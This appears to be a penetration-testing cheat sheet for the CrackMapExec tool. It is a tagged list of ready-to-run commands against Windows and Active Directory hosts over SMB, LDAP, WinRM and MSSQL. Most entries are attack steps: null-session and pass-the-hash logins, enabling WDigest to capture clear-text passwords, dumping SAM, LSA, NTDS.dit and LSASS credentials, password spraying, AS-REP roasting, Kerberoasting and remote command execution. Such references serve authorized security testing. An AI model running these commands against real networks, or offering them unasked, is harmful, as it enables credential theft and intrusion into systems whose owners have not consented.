# cme

% cme, crackmapexec, windows, Active directory

## cme - enumerate hosts, network
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
Example : cme smb 192.168.1.0/24

https://mpgn.gitbook.io/crackmapexec/

```bash
cme smb <ip>
```

## cme - enumerate password policy
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
cme smb <ip> -u <user> -p '<password>' --pass-pol
```

## cme - enumerate null session
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <ip> -u '' -p ''
```

## cme - enumerate anonymous login
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <ip> -u 'a' -p ''
```

## cme - enumerate active sessions
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --sessions
```

## cme - enumerate domain users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --users
```

## cme - enumerate users by bruteforce the RID
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --rid-brute
```

## cme - enumerate domain groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --groups
```

## cme - enumerate local groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --local-groups
```

## cme - enumerate shares
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate permissions on all shares

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --shares
```

## cme - enumerate disks
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate disks on the remote target

```bash
cme smb <ip> -u <user> -p '<password>' --disks
```

## cme - enumerate smb target not signed
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line

```bash
cme smb <ip> --gen-relay-list smb_targets.txt
```

## cme - enumerate logged users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --loggedon-users
```

## cme - enable wdigest
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 

enable/disable the WDigest provider and dump clear-text credentials from LSA memory.

```bash
cme smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
```

## cme - loggout user
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

Can be useful after enable wdigest to force user to reconnect

```bash
cme smb <ip> -u <user> -p '<password>' -x 'quser'
cme smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
```

## cme - local-auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <ip> -u <user> -p <password> --local-auth
```

## cme - local-auth with hash
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

```bash
cme smb <ip> -u <user> -H <hash> --local-auth
```

## cme - domain auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <ip> -u <user> -p <password> -d <domain>
```

## cme - kerberos auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

Previously import ticket : 
export KRB5CCNAME=/tmp/ticket.ccache

```bash
cme smb <ip> --kerberos
```

## cme - Dump SAM
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump SAM hashes using methods from secretsdump.py
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --sam
```

## cme - Dump LSA
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump LSA secrets using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
cme smb <ip> -u <user> -p <password> -d <domaine> --lsa
```

## cme - dump ntds.dit
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump the NTDS.dit from target DC using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --ntds
```

## cme - dump lsass
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> -u <user> -p <password> -d <domain> -M lsassy
```

## cme - dump lsass - with bloodhond update
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## cme - password spray (user=password)
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
```

## cme - password spray multiple test 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning

(carrefull on lockout)

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
```

## cme - put file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## cme - get file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```

## cme - ASREPRoast enum without authentication
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

User can be a wordlist too (user.txt)
Hashcat format  -m 18200 

```bash
cme ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## cme - ASREPRoast enum with authentication
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON  

Hashcat format  -m 18200 

```bash
cme ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
```

## cme - Kerberoasting
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

Hashcat format  -m 13100

```bash
cme ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
```

## cme - Unconstrained delegation
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 

List of all computers et users with the flag TRUSTED_FOR_DELEGATION

```bash
cme ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```

## cme - winrm-auth
#plateform/linux #target/remote #port/5985 #port/5986 #protocol/winrm #cat/ATTACK/CONNECT  

```bash
cme winrm <ip> -u <user> -p <password>
```

## cme - mssql password spray
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/BRUTEFORCE-SPRAY  

```bash
cme mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
```

## cme - mssql execute query
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## cme - mssql execute command
#plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 

```bash
cme mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
```

= ip: 192.168.1.0/24
